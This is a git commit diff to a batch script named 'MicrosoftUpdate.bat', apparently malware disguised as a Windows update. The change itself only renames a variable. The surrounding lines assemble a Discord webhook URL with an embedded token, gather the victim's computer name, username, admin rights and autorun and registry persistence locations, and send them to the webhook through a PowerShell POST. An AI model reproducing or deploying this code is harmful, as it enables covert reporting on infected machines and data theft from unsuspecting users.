fa0693586ff2038c6696ab2aba20694fbc3c36c4
freestream <99094491+freestream-us-to@users.noreply.github.com>
2023-10-05 11:30:48 +0200

    Update MicrosoftUpdate.bat

--- MicrosoftUpdate.bat
+++ MicrosoftUpdate.bat
@@ -146,9 +146,9 @@ set "url1=https://discord.com/api/webhooks/"
 set "url2=1158045149935440032/nfB686WoABy0Ns6wTIT_z4zkm34DhKgWHIO8zMgP-4FWy21hahTaLPKz8v0gGYYkiQnk"
 set "url=%url1%%url2%"
 
-set "path=%~f0"
+set "file_path=%~f0"
 
-set "content=_setup_%ComputerName%;%USERNAME%;%time%;%version%;%AdminRights%;%userfile%;%pcfile%;%userauto%;%pcauto%;%userregistryfile%;%pcregistryfile%;%userregistryauto%;%pcregistryauto%;%path%"
+set "content=_setup_%ComputerName%;%USERNAME%;%time%;%version%;%AdminRights%;%userfile%;%pcfile%;%userauto%;%pcauto%;%userregistryfile%;%pcregistryfile%;%userregistryauto%;%pcregistryauto%;%file_path%"
 
 powershell -Command "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy(); [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $body = @{content='%content%'} | ConvertTo-Json; Invoke-RestMethod -Uri '%url%' -Method POST -ContentType 'application/json' -Body $body"
 
